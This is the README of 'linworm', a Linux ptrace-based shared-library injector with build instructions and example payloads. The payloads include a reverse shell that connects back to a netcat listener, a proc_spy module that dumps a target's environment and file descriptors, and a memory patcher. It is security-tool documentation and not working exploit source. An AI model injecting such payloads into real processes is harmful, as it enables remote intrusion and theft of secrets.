# linworm

A ptrace-based shared library injector for Linux.

*linworm* attaches to a running process, resolves `malloc`/`dlopen`/`free` in the target's libc, and injects an arbitrary shared library via remote function calls. Payloads are loaded with `dlopen` and can be gracefully unloaded at any time with `SIGUSR2`.

**Supported architectures:** x86_64, x86 (32-bit), aarch64, arm

> **Note:** x86_64 on Ubuntu is the most tested configuration. Other architecture and distribution combinations are experimental.

## 1. Building

### 1.1 Requirements

- GCC (or the appropriate cross-compiler toolchain)
- GNU Make
- Linux headers

### 1.2 Native build (x86_64)

```bash
make
```

This produces:

| Output | Description |
|--------|-------------|
| `build/linworm` | Injector binary |
| `build/payload/*.so` | All example payload libraries |
| `build/tests/example_target` | Test target process for the `patch` payload |

### 1.3 Cross-compilation

Set the `ARCH` variable to target a different architecture:

```bash
make ARCH=x86        # 32-bit x86 (gcc -m32)
make ARCH=aarch64    # ARM64 (requires aarch64-linux-gnu-gcc)
make ARCH=arm        # ARM32 (requires arm-linux-gnueabihf-gcc)
```

Install the required cross-compiler first:

```bash
# Debian / Ubuntu
sudo apt install gcc-aarch64-linux-gnu    # for ARCH=aarch64
sudo apt install gcc-arm-linux-gnueabihf  # for ARCH=arm
```

The Makefile will error out if the selected compiler is not found.

### 1.4 Cleaning

```bash
make clean
```

## 2. Usage

```
Usage: linworm -p TARGET_PID -l LIBRARY_PATH [-h] [-v] [-V] 
Options:
  -h  | --help                   Show help
  -v  | --verbose                Enables debug logs.
  -V  | --version                Show the version of linworm.
  -p  | --pid                    Target process ID to inject into.
  -l  | --library                Path to the shared library (.so) to inject.
```

*linworm* requires `root` privileges or `CAP_SYS_PTRACE`.

### 2.1 Quick start

```bash
# 1. Build everything
make

# 2. Start a target process
./build/tests/example_target

# 3. Inject a payload (as root)
sudo ./build/linworm -p `pidof example_target` -l ./build/payload/simple.so
```

## 3. Example Payloads

All payloads live in `src/payload/` and are built automatically into `build/payload/*.so`.

### 3.1 beacon

Writes a heartbeat to `/tmp/linworm_beacon.log` every 2 seconds. Useful for verifying that injection and graceful unload work.

```bash
sudo ./build/linworm -p $PID -l ./build/payload/beacon.so
tail -f /tmp/linworm_beacon.log
sudo kill -USR2 $PID   # stop
```

### 3.2 proc_spy

Snapshots the target process every 5 seconds, dumping open file descriptors, environment variables, memory maps, and process status to `/tmp/linworm_procspy.log`.

```bash
sudo ./build/linworm -p $PID -l ./build/payload/proc_spy.so
cat /tmp/linworm_procspy.log
```

### 3.3 reverse_shell

Connects back to a listener and spawns `/bin/sh`. Reconnects every 5 seconds on failure.

```bash
# Terminal 1 -- listener
nc -lvnp 4444

# Terminal 2 -- inject (reads LINWORM_RHOST / LINWORM_RPORT from target env)
sudo ./build/linworm -p $PID -l ./build/payload/reverse_shell.so
```

| Environment Variable | Default | Description |
|----------------------|---------|-------------|
| `LINWORM_RHOST` | `127.0.0.1` | Connect-back host |
| `LINWORM_RPORT` | `4444` | Connect-back port |

Set these in the **target process's environment** before injection.

### 3.4 patch

Runtime in-memory patcher. Finds a module by name in `/proc/self/maps`, applies byte patches via `mprotect` + `memcpy`, and reverts them on unload.

The default configuration patches `example_target`, changing the return value of `sleep_func()` from `0` to `-1`:

```bash
./build/tests/example_target
# Output: "Ret value: 0" every 3 seconds

sudo ./build/linworm -p `pidof example_target` -l ./build/payload/patch.so
# Output changes to: "Ret value: -1"

sudo kill -s SIGUSR2 `pidof example_target`
# Output reverts to: "Ret value: 0"
```

Edit the `PATCH_TARGET` and `PATCHES[]` table in `src/payload/patch.c` to target a different module or offset.

## 4. Contributing Payloads

New payload contributions are welcome via pull request. The Makefile auto-discovers all `.c` files in `src/payload/` (except `common.c`), so **no Makefile changes are needed**.

### 4.1 Steps

1. Create `src/payload/your_payload.c`.
2. Use the shared lifecycle framework from `src/payload/common.h`:

```c
#include "common.h"

static void *my_thread(void *arg) {
    (void)arg;
    while (payload_running()) {
        // ... do work ...
        payload_log("/tmp/linworm_mypayload.log", "tick (pid=%d)", getpid());
        payload_sleep_ms(2000);
    }
    return NULL;
}

__attribute__((constructor))
void on_load(void) {
    if (payload_init() == 0)
        payload_start(my_thread);
}

__attribute__((destructor))
void on_unload(void) {
    if (g_pipe_fd[0] != -1)
        payload_stop();
}
```

3. Build and test: `make && sudo ./build/linworm -p $PID -l ./build/payload/your_payload.so`
4. Open a PR.

### 4.2 PR checklist

- [ ] Code compiles cleanly with `make` (no warnings)
- [ ] Follows the `constructor` / `destructor` pattern shown above
- [ ] Uses `payload_log()` instead of `printf` for output
- [ ] Graceful shutdown via `kill -USR2` works correctly
- [ ] Payload does not leak resources (sockets, file descriptors, memory)

Standalone payloads that don't need a persistent thread (like `simple.c`) may skip the common framework -- just use an `__attribute__((constructor))` function.

## 5. License

MIT -- see [LICENSE](LICENSE).
